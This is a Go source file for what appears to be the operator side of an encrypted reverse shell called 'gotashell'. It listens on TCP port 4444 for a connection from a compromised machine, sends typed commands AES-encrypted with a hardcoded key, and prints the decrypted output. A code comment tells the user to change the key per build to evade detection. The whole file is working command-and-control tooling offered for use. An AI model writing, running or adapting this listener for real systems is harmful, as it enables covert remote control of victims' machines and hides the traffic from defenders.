package main

import (
	"bufio"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"io"
	"net"
	"os"
	"strings"
	"time"

	"github.com/fatih/color"
)

const port = ":4444"

func main() {
	red := color.New(color.FgHiRed, color.Bold)
	green := color.New(color.FgHiGreen, color.Bold)
	// set your custom 32 bytes key here (change per each build to evade detection/decryption)
	key := []byte("JaNdRgUkXp2s5v8x/A?D(G+KbPeShVmY")
	red.Println("Listening....")
	listener, _ := net.Listen("tcp", port)
	conn, err := listener.Accept()
	if err != nil {
		fmt.Printf("Fuck", err)
	}
	
	fmt.Println("\n██████╗  ██████╗ ████████╗     █████╗     ███████╗██╗  ██╗███████╗██╗     ██╗     \n██╔════╝ ██╔═══██╗╚══██╔══╝    ██╔══██╗    ██╔════╝██║  ██║██╔════╝██║     ██║     \n██║  ███╗██║   ██║   ██║       ███████║    ███████╗███████║█████╗  ██║     ██║     \n██║   ██║██║   ██║   ██║       ██╔══██║    ╚════██║██╔══██║██╔══╝  ██║     ██║     \n╚██████╔╝╚██████╔╝   ██║       ██║  ██║    ███████║██║  ██║███████╗███████╗███████╗\n╚═════╝  ╚═════╝    ╚═╝       ╚═╝  ╚═╝    ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝")

	for {
		reader := bufio.NewReader(os.Stdin)
		red.Print("gotashell> ")
		command, _ := reader.ReadString('\n')
		if strings.Compare(command, "exit") == 0 {
			enc_command := encryption(true, key, command)

			conn.Write([]byte(enc_command))
			conn.Close()
			os.Exit(0)

		} else {
			enc_command := encryption(true, key, command)
			conn.Write([]byte(enc_command))
			enc_output, _ := bufio.NewReader(conn).ReadString('\n')
			dec_output := encryption(false, key, string(enc_output))
			green.Println(string(dec_output))
		}
	}
}

func handleConnection(conn net.Conn) {
	defer conn.Close()
	notify := make(chan error)
	go func() {
		buf := make([]byte, 1024)
		for {
			n, err := conn.Read(buf)
			if err != nil {
				notify <- err
				return
			}
			if n > 0 {
				fmt.Println("unexpected data: %s", buf[:n])
			}
		}
	}()

	for {
		select {
		case err := <-notify:
			if io.EOF == err {
				fmt.Println("connection dropped message", err)
				return
			}
		case <-time.After(time.Second * 1):
			fmt.Println("timeout 1, still alive")
		}
	}
}

func encryption(encrypt bool, key []byte, message string) (result string) {
	// encrypts message if the encrypt bool is true else decrypts
	if encrypt {
		plainText := []byte(message)
		block, err := aes.NewCipher(key)
		if err != nil {
			fmt.Println(err)
		}

		cipherText := make([]byte, aes.BlockSize+len(plainText))
		iv := cipherText[:aes.BlockSize]
		if _, err = io.ReadFull(rand.Reader, iv); err != nil {
			fmt.Println(err)
		}

		stream := cipher.NewCFBEncrypter(block, iv)
		stream.XORKeyStream(cipherText[aes.BlockSize:], plainText)
		result = base64.URLEncoding.EncodeToString(cipherText)

	} else {
		cipherText, err := base64.URLEncoding.DecodeString(message)
		if err != nil {
			fmt.Println(err)
		}

		block, err := aes.NewCipher(key)
		if err != nil {
			fmt.Println(err)
		}

		iv := cipherText[:aes.BlockSize]
		cipherText = cipherText[aes.BlockSize:]
		stream := cipher.NewCFBDecrypter(block, iv)
		stream.XORKeyStream(cipherText, cipherText)
		result = string(cipherText)
	}
	return
}
